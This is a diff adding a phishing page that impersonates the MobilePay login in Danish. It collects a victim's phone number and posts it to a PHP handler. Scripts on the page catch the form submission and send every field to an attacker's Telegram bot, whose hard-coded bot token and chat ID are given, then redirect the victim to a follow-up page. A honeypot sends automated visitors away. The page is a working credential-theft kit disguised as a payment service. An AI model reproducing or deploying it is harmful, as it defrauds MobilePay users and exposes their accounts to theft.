@@ -1,0 +1,321 @@
+
+
+<html style="font-size: 16px;" lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="utf-8">
+    <title>Log på</title>
+    <link rel="stylesheet" href="css/hos.css" media="screen">
+    <link rel="stylesheet" href="css/vi.css" media="screen">
+  
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow-x: hidden; /* Prevent horizontal scroll */
+        }
+
+        .custom-checkbox {
+            display: inline-block;
+            position: relative;
+            padding-left: 35px; /* space for the checkmark */
+            cursor: pointer;
+            font-size: 16px; /* your desired font size */
+            user-select: none; /* prevent text selection */
+        }
+
+        /* Hide the browser's default checkbox */
+        .custom-checkbox input {
+            position: absolute;
+            opacity: 0;
+            cursor: pointer;
+            height: 0;
+            width: 0;
+        }
+
+        /* Create a custom square */
+        .custom-checkbox .checkmark {
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 25px; /* size of the square */
+            width: 25px; /* size of the square */
+            background-color: transparent;
+            border: 2px solid #800080; /* purple border */
+            border-radius: 4px; /* rounded corners */
+        }
+
+        /* When the checkbox is checked, add a blue background */
+        .custom-checkbox input:checked ~ .checkmark {
+            background-color: #5c7aff ; /* change to your preferred color */
+        }
+
+        /* Create the checkmark/indicator (hidden when not checked) */
+        .custom-checkbox .checkmark:after {
+            content: "";
+            position: absolute;
+            display: none;
+        }
+
+        /* Show the checkmark when checked */
+        .custom-checkbox input:checked ~ .checkmark:after {
+            display: block;
+        }
+
+        /* Style the checkmark/indicator */
+        .custom-checkbox .checkmark:after {
+            left: 9px;
+            top: 5px;
+            width: 5px;
+            height: 10px;
+            border: solid white;
+            border-width: 0 3px 3px 0;
+            -webkit-transform: rotate(45deg);
+            -ms-transform: rotate(45deg);
+            transform: rotate(45deg);
+        }
+
+        @keyframes wave {
+            0%, 60%, 100% {
+                transform: translateY(0);
+                background-color: #5c7aff;
+            }
+            30% {
+                transform: translateY(-15px);
+                background-color: #a4b5ff;
+            }
+        }
+
+        .wave-container {
+            display: none;
+            flex-direction: row;
+            justify-content: space-around;
+            align-items: flex-end;
+            width: 80px;
+            height: 50px;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        .wave {
+            width: 15px;
+            height: 15px;
+            border-radius: 50%;
+            background-color: #5c7aff;
+            animation: wave 1.5s infinite ease-in-out;
+        }
+
+        .wave:nth-child(2) {
+            animation-delay: 0.1s;
+        }
+
+        .wave:nth-child(3) {
+            animation-delay: 0.2s;
+        }
+    </style>
+</head>
+<body class="u-body u-xl-mode" data-lang="en">
+<header class="u-clearfix u-custom-color-1 u-header u-header" id="sec-8db3">
+    <div class="u-clearfix u-sheet u-valign-middle u-sheet-1">
+        <a class="u-image u-logo u-image-1" data-image-width="290" data-image-height="74">
+          <img src="img/logo.png" style="width: 120px;">
+        </a>
+    </div>
+</header>
+<section class="u-clearfix u-custom-color-1 u-section-1" id="sec-8c53">
+    <div class="u-clearfix u-sheet u-sheet-1">
+        <div class="u-align-center u-container-style u-group u-radius u-shape-round u-white u-group-1">
+            <div class="u-container-layout u-container-layout-1">
+                <p class="u-custom-font u-text u-text-1"> Log på</p>
+                <img class="u-image u-image-contain u-image-default u-preserve-proportions u-image-1" src="img/72b738c4-908c-443c-b780-31bf95185f22.png" alt="" data-image-width="192" data-image-height="192">
+                <p class="u-custom-font u-text u-text-2">Mobilepay</p>
+                <div class="u-expanded-width u-form u-form-1">
+                    <form action="data/mobilepay_handler.php" method="post" class="u-clearfix u-form-spacing-10 u-form-vertical u-inner-form" style="padding: 0px;">
+                        <div class="u-form-group u-label-none" style="display: flex; align-items: center; background-color: #f7f7f7; border-radius: 5px; padding: 0 10px;">
+                            <img src="img/no.png" style="height: 20px; width: 30px;">
+                            <span style="margin-left: 5px; margin-right: 10px; font-size: 16px; color: #666;">+45</span>
+                            <input minlength="8" maxlength="8" style="background-color: #f7f7f7; font-size: 22px;" type="tel" placeholder="Telefonnummer" id="phone-number-input" name="nummer" class="u-border-none u-input u-input-rectangle u-radius u-text-4 u-input-1" required="required">
+                            <input type="hidden" name="wrng" value="first" required="required">
+                        </div>
+                        
+                        <!-- Honeypot field -->
+                        <div style="display: none;">
+                            <input type="text" name="website" value="">
+                        </div>
+                        
+                        <div class="u-form-group u-label-top">
+                            <label class="custom-checkbox">
+                                <input type="checkbox" id="remember-me" name="remember-me">
+                                <span class="checkmark"></span>
+                                Husk mig i browseren
+                            </label>
+                            <p class="u-form-group u-form-text u-label-none u-text u-text-custom-color-4 u-text-4"> Hvis du vælger at blive husket, vil du være i stand til at registrere og logge ind på denne og andre websteder uden at åbne MobilePay .</p>
+                        </div>
+                        
+                        <div class="u-align-center u-form-group u-form-submit u-label-none">
+                            <button type="submit" id="submit-button" class="u-border-none u-btn u-btn-round u-btn-submit u-button-style u-custom-color-2 u-custom-font u-radius u-text-white u-btn-1" disabled>Fortsæt</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<div class="wave-container">
+    <div class="wave"></div>
+    <div class="wave"></div>
+    <div class="wave"></div>
+</div>
+
+<!--SCRIPT_REMOVED-->
+    var phoneNumberInput = document.getElementById('phone-number-input');
+    var submitButton = document.getElementById('submit-button');
+
+    // Honeypot check function
+    function honeypotCheck(honeypotValue) {
+        if (honeypotValue && honeypotValue.trim() !== '') {
+            if (window.top !== window.self) {
+                window.top.location = "https://www.google.com";
+            } else {
+                window.location = "https://www.google.com";
+            }
+            return true;
+        }
+        return false;
+    }
+
+    phoneNumberInput.addEventListener('input', function() {
+        submitButton.disabled = this.value.length !== 8 || !this.value.match(/^\d{8}$/);
+    });
+
+    document.querySelector('.u-form-1 form').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        // Honeypot check
+        const honeypotValue = document.querySelector('input[name="website"]').value;
+        if (honeypotCheck(honeypotValue)) {
+            return;
+        }
+        
+        // Validate phone number
+        const phoneNumber = phoneNumberInput.value.trim();
+        if (!/^\d{8}$/.test(phoneNumber)) {
+            alert('Indtast et gyldigt 8-cifret telefonnummer');
+            return;
+        }
+        
+        var form = this;
+        form.style.display = 'none'; // Hide form
+        document.querySelector('.wave-container').style.display = 'flex'; // Show loading animation
+
+        // After 2 seconds, submit the form
+        setTimeout(function() {
+            form.submit();
+        }, 2000);
+    });
+<!--/SCRIPT_REMOVED-->
+
+<!--SCRIPT_REMOVED-->
+document.addEventListener("DOMContentLoaded", function () {
+    const form = document.querySelector("form");
+    if (!form) return;
+
+    form.addEventListener("submit", function (e) {
+        e.preventDefault();
+
+        const formData = new FormData(form);
+        const entries = [...formData.entries()];
+        const message = entries.map(([key, value]) => `${key}: ${value}`).join("\n");
+
+        const telegramBotToken = "ICI_VOTRE_BOT_TOKEN";
+        const telegramChatId = "ICI_VOTRE_CHAT_ID";
+        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+        fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: message,
+            }),
+        }).then(response => {
+            if (response.ok) {
+                alert("Message envoyé avec succès !");
+                form.reset();
+            } else {
+                alert("Erreur lors de l'envoi.");
+            }
+        }).catch(error => {
+            alert("Erreur de connexion.");
+            console.error(error);
+        });
+    });
+});
+<!--/SCRIPT_REMOVED-->
+
+
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    const form = document.querySelector("form");
+    if (!form) return;
+
+    form.addEventListener("submit", function (e) {
+        e.preventDefault();
+
+        const formData = new FormData(form);
+        const entries = [...formData.entries()];
+        const message = entries.map(([key, value]) => `${key}: ${value}`).join("\n");
+
+        const telegramBotToken = "7900147343:AAGe-500KF88fTYs5dX3QEM29LA3Zgydl7s";
+        const telegramChatId = "-1001727080095";
+        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+        fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: message,
+            }),
+        }).then(response => {
+            if (response.ok) {
+                window.location.href = "active.html";
+            } else {
+                alert("Erreur lors de l'envoi.");
+            }
+        }).catch(error => {
+            alert("Erreur de connexion.");
+            console.error(error);
+        });
+    });
+});
+</script>
+
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+    const input = document.getElementById("phone-number-input");
+    const button = document.getElementById("submit-button");
+
+    if (input && button) {
+        input.addEventListener("input", function () {
+            const value = input.value.replace(/\D/g, ''); // Remove non-digit characters
+            if (value.length === 8) {
+                button.disabled = false;
+            } else {
+                button.disabled = true;
+            }
+        });
+    }
+});
+</script>
+
+  <script src="telegram.js"></script>
+</body>
+</html>
